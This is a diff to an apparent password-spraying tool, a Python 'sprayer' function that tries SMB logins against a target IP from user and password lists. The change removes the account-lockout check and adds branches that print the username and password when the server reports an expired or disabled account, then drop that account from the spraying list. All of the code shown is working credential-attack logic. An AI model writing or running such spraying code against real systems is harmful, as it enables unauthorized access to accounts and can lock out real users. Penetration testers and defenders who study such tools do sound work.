@@ -54,9 +54,13 @@ def sprayer(domain, user_list, password_list, target_ip, output):
             if answer == "Connection to %s failed (Error was NT_STATUS_CONNECTION_REFUSED)\n" % target_ip:
                 print("Unable to connect to server")
                 quit()
-            # check to see if the account is locked out, if so, print out the account and remove from spraying list
-            elif answer == "Cannot connect to server.  Error was NT_STATUS_ACCOUNT_LOCKED_OUT\n":
-                print(answer.replace("\n", "") + " using the account " + user)
+            # check to see if the account is expired, if so, print out the account and remove from spraying list
+            elif answer == "session setup failed: NT_STATUS_PASSWORD_EXPIRED\n":
+                print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
+                temp_users.remove(user)
+            # check to see if the account is disabled if so, print out the account and remove from spraying list
+            elif answer == "session setup failed: NT_STATUS_ACCOUNT_DISABLED\n":
+                print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
                 temp_users.remove(user)
             # if logon fails, drop the response, any other response, print to screen and remove account from spraying
             elif answer != "session setup failed: NT_STATUS_LOGON_FAILURE\n":
